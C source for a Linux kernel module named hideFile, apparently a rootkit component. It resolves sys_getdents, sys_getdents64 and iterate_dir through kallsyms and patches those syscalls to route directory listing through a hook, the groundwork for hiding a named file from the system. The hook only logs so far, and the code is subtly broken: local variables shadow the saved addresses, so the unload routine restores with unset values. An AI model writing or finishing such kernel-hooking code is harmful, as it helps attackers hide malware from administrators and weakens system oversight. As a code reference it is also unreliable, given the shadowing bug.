#include <linux/slab.h>
#include "HideFile.h"

static unsigned long long addr_sys_getdents;
static unsigned long long addr_sys_getdents64;
static unsigned long long addr_iterate_dir;

static int hook_iter(struct file *file, struct dir_context *ctx)
{
	const char* filename = file->f_path.dentry->d_name.name;
	printk(KERN_INFO "hooked iter :%s\n", filename);	
	return iterate_dir(file, ctx);
}

static int __init hideFile_init(void)
{
	printk(KERN_INFO "init\n"); 
	printk(KERN_INFO "fileToHide:%s\n" , fileToHide);


	unsigned long addr_sys_getdents = kallsyms_lookup_name("sys_getdents");
	unsigned long addr_sys_getdents64 = kallsyms_lookup_name("sys_getdents64");
	unsigned long addr_iterate_dir = kallsyms_lookup_name("iterate_dir");


	patch_kernel_func(addr_sys_getdents, addr_iterate_dir, (unsigned long long )hook_iter);
	patch_kernel_func(addr_sys_getdents64, addr_iterate_dir, (unsigned long long )hook_iter);

	return 0;
}

static void __exit hideFile_exit(void)
{
	/*recover vfs_readdir*/
	patch_kernel_func(addr_sys_getdents, (unsigned long long )hook_iter, addr_iterate_dir);	
	patch_kernel_func(addr_sys_getdents64, (unsigned long long )hook_iter, addr_iterate_dir);	
	printk(KERN_INFO "exit\n");
}

